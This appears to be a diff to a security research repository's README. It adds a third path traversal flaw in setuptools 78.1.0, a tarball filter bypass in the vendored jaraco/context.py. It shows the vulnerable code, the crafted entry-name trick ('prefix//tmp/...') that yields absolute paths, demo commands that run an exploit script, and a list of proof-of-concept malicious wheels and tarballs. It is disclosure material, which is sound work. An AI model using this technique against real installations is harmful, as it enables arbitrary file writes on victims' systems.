@@ -1,11 +1,61 @@
 # Setuptools Path Traversal Vulnerabilities
 
-This repository documents **two distinct path traversal vulnerabilities** in setuptools 78.1.0:
+This repository documents **three distinct path traversal vulnerabilities** in setuptools 78.1.0:
 
 | Vulnerability | Component | Attack Vector | Impact |
 |--------------|-----------|---------------|--------|
 | [URL Path Injection](#vulnerability-1-url-path-injection) | `package_index.py` | Malicious package index | Arbitrary file write with attacker content |
 | [Namespace Package Traversal](#vulnerability-2-namespace-package-traversal) | `wheel.py` | Malicious wheel file | Directory + file creation outside install dir |
+| [Tarball Filter Bypass](#vulnerability-3-tarball-filter-bypass) | `jaraco/context.py` | Malicious tarball URL | Arbitrary file write with attacker content |
+
+---
+
+## Vulnerability 3: Tarball Filter Bypass
+
+**NEW: Arbitrary file write via strip_first_component filter bypassing tarfile security**
+
+| Field | Value |
+|-------|-------|
+| **Component** | `setuptools/_vendor/jaraco/context.py:64-76` |
+| **Function** | `tarball()` with `strip_first_component` filter |
+| **Type** | Path Traversal (CWE-22) |
+| **Impact** | Arbitrary file write with attacker content |
+
+### Quick Demo
+
+```bash
+cd tarball_vuln/
+rm -rf /tmp/pwned_by_tarball
+python3 exploit_test.py
+cat /tmp/pwned_by_tarball/evil.txt
+```
+
+### The Bug
+
+```python
+def strip_first_component(member, path):
+    _, member.name = member.name.split('/', 1)  # No validation!
+    return member
+
+# Tarball entry: "prefix//tmp/evil.txt"
+# After split: member.name = "/tmp/evil.txt" (ABSOLUTE PATH!)
+# File extracted to /tmp/evil.txt instead of target_dir/tmp/evil.txt
+```
+
+### Attack Flow
+
+```
+Tarball entry: prefix//tmp/pwned/evil.txt
+                     ^^
+                     Double slash creates absolute path after split
+
+split('/', 1) → ('prefix', '/tmp/pwned/evil.txt')
+member.name   → '/tmp/pwned/evil.txt'
+
+Result: Attacker's file content written to /tmp/pwned/evil.txt
+```
+
+See [tarball_vuln/TARBALL.md](tarball_vuln/TARBALL.md) for full technical analysis.
 
 ---
 
@@ -186,11 +236,17 @@ Impact:  Code execution on every new shell
 ├── client/
 │   ├── Dockerfile              # Victim with vulnerable setuptools
 │   └── victim_client.py        # Demonstrates exploitation
-├── namespace_packages_vuln/    # NEW: wheel.py namespace traversal
+├── namespace_packages_vuln/    # wheel.py namespace traversal
 │   ├── RESEARCH.md             # Technical deep dive
 │   ├── build_malicious_wheel.py    # Creates malicious wheel
 │   ├── exploit_test.py         # Triggers vulnerability
 │   └── malicious-1.0-py3-none-any.whl  # Pre-built PoC wheel
+├── tarball_vuln/               # NEW: jaraco/context.py tarball traversal
+│   ├── TARBALL.md              # Technical deep dive
+│   ├── build_malicious_tarball.py  # Creates malicious tarballs
+│   ├── exploit_test.py         # Triggers vulnerability
+│   ├── malicious_absolute.tar.gz   # PoC (absolute path attack)
+│   └── malicious_traversal.tar.gz  # PoC (traversal attack)
 ├── Dockerfile                  # Standalone single-container demo
 ├── demo_scenarios.py           # All three scenarios in one script
 ├── poc_direct_download.py      # Simplest PoC
@@ -305,7 +361,9 @@ This is a **different vulnerability** from the March 2024 command injection repo
 
 - [RESEARCH.md](RESEARCH.md) - Full technical deep dive (package_index.py)
 - [namespace_packages_vuln/RESEARCH.md](namespace_packages_vuln/RESEARCH.md) - Technical analysis (wheel.py)
+- [tarball_vuln/TARBALL.md](tarball_vuln/TARBALL.md) - Technical analysis (jaraco/context.py)
 - [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
+- [PEP 706: Tarfile Extraction Filters](https://peps.python.org/pep-0706/)
 - [Python os.path.join docs](https://docs.python.org/3/library/os.path.html#os.path.join)
 - [setuptools GitHub](https://github.com/pypa/setuptools)
 
